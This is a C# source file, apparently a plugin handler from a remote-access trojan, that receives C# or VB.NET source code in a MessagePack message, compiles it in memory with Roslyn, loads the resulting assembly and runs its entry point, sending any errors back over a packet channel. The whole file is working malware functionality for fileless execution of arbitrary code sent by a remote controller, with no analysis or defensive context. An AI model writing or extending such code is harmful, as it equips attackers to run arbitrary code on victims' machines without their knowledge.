using Plugin;
using MessagePackLib.MessagePack;
using System;
using System.IO;
using System.Linq;
using System.Reflection;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.VisualBasic;

namespace Miscellaneous.Handler
{
    public class HandlerExecuteDotNetCode
    {
        public HandlerExecuteDotNetCode(MsgPack unpack_msgpack)
        {
            switch (unpack_msgpack.ForcePathObject("Option").AsString)
            {
                case "C#":
                    {
                        CompileAndRun(isCSharp: true, unpack_msgpack.ForcePathObject("Code").AsString, unpack_msgpack.ForcePathObject("Reference").AsString.Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries));
                        break;
                    }

                case "VB.NET":
                    {
                        CompileAndRun(isCSharp: false, unpack_msgpack.ForcePathObject("Code").AsString, unpack_msgpack.ForcePathObject("Reference").AsString.Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries));
                        break;
                    }
            }
        }

        private void CompileAndRun(bool isCSharp, string source, string[] referencedAssemblies)
        {
            try
            {
                var references = AppDomain.CurrentDomain.GetAssemblies()
                    .Where(a => !a.IsDynamic && !string.IsNullOrEmpty(a.Location))
                    .Select(a => MetadataReference.CreateFromFile(a.Location))
                    .Cast<MetadataReference>()
                    .ToList();

                foreach (var r in referencedAssemblies.Where(r => !string.IsNullOrWhiteSpace(r) && File.Exists(r)))
                    references.Add(MetadataReference.CreateFromFile(r));

                Compilation compilation;
                if (isCSharp)
                {
                    var syntaxTree = CSharpSyntaxTree.ParseText(source);
                    compilation = CSharpCompilation.Create("DynamicAssembly", new[] { syntaxTree }, references,
                        new CSharpCompilationOptions(OutputKind.WindowsApplication));
                }
                else
                {
                    var syntaxTree = VisualBasicSyntaxTree.ParseText(source);
                    compilation = VisualBasicCompilation.Create("DynamicAssembly", new[] { syntaxTree }, references,
                        new VisualBasicCompilationOptions(OutputKind.WindowsApplication));
                }

                using var ms = new MemoryStream();
                var result = compilation.Emit(ms);

                if (!result.Success)
                {
                    var errors = result.Diagnostics.Where(d => d.Severity == DiagnosticSeverity.Error);
                    foreach (var error in errors)
                    {
                        var lineSpan = error.Location.GetLineSpan();
                        Packet.Error(string.Format("{0}\nLine: {1}", error.GetMessage(), lineSpan.StartLinePosition.Line + 1));
                        break;
                    }
                }
                else
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    Assembly assembly = Assembly.Load(ms.ToArray());
                    MethodInfo methodInfo = assembly.EntryPoint;
                    object injObj = assembly.CreateInstance(methodInfo.Name);
                    object[] parameters = new object[1];
                    if (methodInfo.GetParameters().Length == 0)
                    {
                        parameters = null;
                    }
                    methodInfo.Invoke(injObj, parameters);
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }
    }

}
